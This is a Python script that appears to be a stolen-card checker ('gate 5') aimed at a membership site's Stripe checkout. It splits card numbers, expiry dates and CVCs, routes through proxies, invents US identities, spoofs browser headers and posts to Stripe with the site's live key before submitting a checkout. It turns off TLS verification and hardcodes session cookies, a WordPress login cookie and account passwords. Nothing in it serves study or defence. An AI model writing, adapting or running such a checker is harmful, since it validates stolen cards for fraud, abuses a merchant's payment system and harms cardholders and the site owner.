import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#$39.99
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele5(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=a15b3074-6211-4983-a495-83194d47b9ddc92430&sid=75c8249f-ca15-410c-a5b7-ccc52855c5153db6a2&payment_user_agent=stripe.js%2F99c4d0c3e9%3B+stripe-js-v3%2F99c4d0c3e9%3B+split-card-element&referrer=https%3A%2F%2Fdavidjalbert.tv&time_on_page=1359602&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1GVglSLZMkghprdf'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet5" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://davidjalbert.tv/index.php/membership-account/membership-checkout/?level=2'

    headers1 = {
       'authority': 'davidjalbert.tv',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://davidjalbert.tv',
        'referer': 'https://davidjalbert.tv/index.php/membership-account/membership-checkout/?level=2',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX3220",
    "CardType": "visa",
    "ExpirationMonth": "06",
    "ExpirationYear": "2025",
    "bconfirmemail": "thih09089@bugfoo.com",
    "bemail": "thih09089@bugfoo.com",
    "checkjavascript": "1",
    "fullname": "",
    "javascriptok": "1",
    "level": "2",
    "password": "Tagiharima28@@Tagiharima28@@",
    "password2": "Tagiharima28@@Tagiharima28@@",
    "payment_method_id": id,
    "submit-checkout": "1",
    "username": "thi09089",
    }
    
    cookies = {
     "__stripe_mid": "a15b3074-6211-4983-a495-83194d47b9ddc92430",
    "__stripe_sid": "75c8249f-ca15-410c-a5b7-ccc52855c5153db6a2",
    "_lscache_vary": "c0f5ed7a9df60a4f3cc2d0b5f33f5810",
    "o2s-chl": "31e1950874a458046d99b3c5d2d4cfa3",
    "PHPSESSID": "6080b9bf86e8d545ddf9d5dec0e02b9a",
    "pmpro_visit": "1",
    "wordpress_logged_in_f5fc7f42368e93bd47148fb1d6ec05d4": "thi09089%7C1698239279%7Ch1y501yIe5uzzJE3eMusevq3gfypvpsvXni6kozRX1G%7Cfd84c2421101130c358337e0dea50e52bd731569edbacd3cb56d70657987e05d",
    }

    
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 5")





